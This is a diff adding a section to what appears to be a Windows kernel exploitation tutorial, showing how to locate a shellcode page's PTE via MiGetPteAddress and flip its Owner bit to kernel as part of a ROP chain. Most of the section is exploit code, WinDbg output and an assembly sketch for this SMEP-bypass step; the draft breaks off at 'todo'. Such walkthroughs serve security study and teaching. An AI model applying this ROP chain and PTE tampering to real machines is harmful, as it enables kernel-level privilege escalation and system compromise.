@@ -380,6 +380,89 @@ Feel free to have a go at this yourself. I am going to discuss a way we can play
 
 ## Modifying Page Table Entries
 
+A Page Table Entry (PTE) in Windows is a data structure that maps a virtual address to a physical address in memory. It contains information such as the page's physical address, access permissions (read/write), whether the page is present in memory, and other control bits like caching and execution permissions. PTEs are crucial for managing virtual memory, ensuring that the operating system can efficiently translate virtual addresses used by applications into actual physical memory locations.
+
+The Kernel has a function named `MiGetPteAddress` that will take our virtual address as a parameter and return the address of the **PTE**. We can find the offset for this function in **WinDbg**:
+
+```
+1: kd> ?nt!MiGetPteAddress-nt
+Evaluate expression: 3419076 = 00000000`00342bc4
+```
+
+We can use this offset in our ROP chain to find the address of the virtual memory we allocated for our shellcode, let's replace our ROP chain code:
+
+```c
+QWORD* rop = (QWORD*)((QWORD)STACK_PIVOT_ADDR);
+
+*(rop + index++) = kernelBase + 0x90b2c3;       // pop rcx; ret;
+*(rop + index++) = (QWORD)alloc;
+*(rop + index++) = kernelBase + 0x342bc4;       // MiGetPteAddress
+
+// trigger a break
+*(rop + index++) = INT3;
+```
+
+Using 64-bit calling convention we `pop` the address of our allocated memory in `rcx` as the first parameter. We then `ret` to `MiGetPteAddress`.
+
+Compile and run the exploit on our target, with the debugger attached. The breakpoint should be hit:
+
+```
+Break instruction exception - code 80000003 (first chance)
+nt!ExpQuerySystemInformation$filt$41+0xa:
+fffff800`11252b70 cc              int     3
+```
+
+We can examine the registers, `rax` should hold the **PTE** for the virtual memory allocated for our shellcode:
+
+```
+1: kd> r
+rax=ffffde80e2765180 rbx=ffff82862c702190 rcx=00000000e2765180
+rdx=0000000000000001 rsi=000000000000004d rdi=0000000000000003
+rip=fffff80011252b70 rsp=00000000f6000020 rbp=ffff82862f219050
+ r8=0000000000000008  r9=000000000000004d r10=000000006b636148
+r11=fffff68fe05aa718 r12=0000000000000000 r13=0000000000000000
+r14=ffff82862c702190 r15=0000000000000010
+iopl=0         nv up ei ng nz na pe nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040282
+nt!ExpQuerySystemInformation$filt$41+0xa:
+fffff800`11252b70 cc              int     3
+```
+
+We can view this structure in **WinDbg**:
+
+```
+1: kd> dt _MMPTE_HARDWARE ffffde80e2765180
+nt!_MMPTE_HARDWARE
+   +0x000 Valid            : 0y1
+   +0x000 Dirty1           : 0y1
+   +0x000 Owner            : 0y1
+   +0x000 WriteThrough     : 0y0
+   +0x000 CacheDisable     : 0y0
+   +0x000 Accessed         : 0y1
+   +0x000 Dirty            : 0y1
+   +0x000 LargePage        : 0y0
+   +0x000 Global           : 0y0
+   +0x000 CopyOnWrite      : 0y0
+   +0x000 Unused           : 0y0
+   +0x000 Write            : 0y1
+   +0x000 PageFrameNumber  : 0y0000000000000000001001000111101111001100 (0x247bcc)
+   +0x000 ReservedForSoftware : 0y0000
+   +0x000 WsleAge          : 0y0000
+   +0x000 WsleProtection   : 0y000
+   +0x000 NoExecute        : 0y0
+```
+
+Notice that the 3rd bit is the `Owner` and is currently valued at `1` (User). Our next task is to build a ROP chain to change this bit to `0` (Kernel). This would be quite easy in `asm`:
+
+```masm
+pop rcx, [memory of VA for shellcode]      ; set parameter to address of shellcode
+call MiGetPteAddress                       ; call MiGetPteAddress
+mov r10, rax                               ; save returned value for later
+mov rcx, qword [rax]                       ; move the value in the PTE to rcx
+sub rcx, 0x4                               ; zero the 3rd bit
+mov qword [r10], rcx                       ; save the new value back to the PTE address
+```
+
 todo
 
 ## User Mode Code Execution Take 2
